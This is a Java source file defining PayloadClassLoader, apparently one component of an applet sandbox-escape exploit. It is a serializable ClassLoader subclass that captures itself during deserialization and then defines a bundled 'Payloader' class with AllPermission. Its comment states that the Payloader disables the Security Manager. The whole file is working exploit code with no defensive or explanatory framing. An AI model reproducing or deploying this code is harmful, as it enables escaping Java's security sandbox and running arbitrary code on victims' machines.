import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

/**
 * This class is a classloader and loads our Payloader class that disables the
 * Security Manager
 * 
 * @author mka
 * 
 */
public class PayloadClassLoader extends ClassLoader implements Serializable {

	private static final long serialVersionUID = -7072212342699783162L;
	public static PayloadClassLoader instance = null;

	private void writeObject(ObjectOutputStream paramObjectOutputStream)
			throws IOException, ClassNotFoundException {
		paramObjectOutputStream.defaultWriteObject();
	}

	private void readObject(ObjectInputStream paramObjectInputStream)
			throws IOException, ClassNotFoundException {
		instance = this;
		paramObjectInputStream.defaultReadObject();
	}

	public void loadIt() throws IOException, InstantiationException,
			IllegalAccessException {

		ByteArrayOutputStream localObject1;
		byte[] localObject2;
		InputStream localObject3;

		localObject1 = new ByteArrayOutputStream();
		localObject2 = new byte[8192];

		localObject3 = super.getClass().getResourceAsStream("/Payloader.class");
		int j;
		while ((j = (localObject3).read(localObject2)) > 0) {

			(localObject1).write(localObject2, 0, j);
		}
		localObject2 = (localObject1).toByteArray();

		URL localURL = new URL("file:///");
		Class localClass;

		Certificate[] arrayOfCertificate = new Certificate[0];

		Permissions localPermissions = new Permissions();
		localPermissions.add(new AllPermission());

		ProtectionDomain localProtectionDomain = new ProtectionDomain(
				new CodeSource(localURL, arrayOfCertificate), localPermissions);
		localClass = defineClass("Payloader", localObject2, 0,
				localObject2.length, localProtectionDomain);
		localClass.newInstance();

	}

}
